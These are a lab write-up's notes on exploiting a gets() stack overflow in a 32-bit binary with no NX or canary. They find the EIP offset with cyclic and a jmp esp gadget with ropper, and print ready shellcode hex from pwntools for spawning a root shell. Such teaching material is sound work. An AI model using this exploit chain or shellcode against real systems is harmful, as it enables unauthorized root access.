Injecting Shell Code

here there is no interesting function we want to redirect the execution to

server: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=17a0c596cb6e2e09548a395e34cc676cf85ecd26, for GNU/Linux 3.2.0, not stripped

    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX unknown - GNU_STACK missing
    PIE:      No PIE (0x8048000)
    Stack:    Executable
    RWX:      Has RWX segments

# sudo chown root:root flag.txt

******
Since NX is disabled, we can inject code into the stack and execute it

********

feedback() function using gets() instead of fgets() 

We want to jump to ESP to execute rest of our input that is shellcode that is on the stack	

#cyclic 100
*EIP  0x61616174 ('taaa')
#cyclic -l taaa        OR
#cyclic -l 0x61616174
Found at offset 76

so we need to write 76 bytes before we reach EIP and overflow return address

We want to provide the address of 
jmp esp : gadget 

So 

padding of 76 bytes  +  jmp esp 4 bytes + shellcode

# python2 -c "print 'A' * 76 + 'B' * 4 + 'C' * 100 "

put this input and check response

*ESP  0xfffd5920 ◂— 'CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC'
*EIP  0x42424242 ('BBBB')

**********
So if EIP was jmp esp, it would jump there and execute all our instrutions provided we dont have NX protection set
*********

# ropper --file server --search "jmp esp"
0x0804919f: jmp esp;

use shellcraft library from pwntools

#shellcraft -h
#shellcraft -l    : to list shellcodes
select 32 bit linux

i386.linux.sh

# shellcraft i386.linux.sh
6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80

Gives us hex, change format to assembly

# shellcraft i386.linux.sh -f a
-f : format   a: assembly

and we get assembly code for getting a shell on linux 32 bit

**********
Make sure that
1) flag.txt has  chmod 600
2) server has chown root:root and chmod 4655 or chmod u+s

i did not have server to chown root thats why my payload wasnt working


If we decide to get a shell, we can that run commands as root
#cat flag.txt

We can also use msfvenom for shellcode

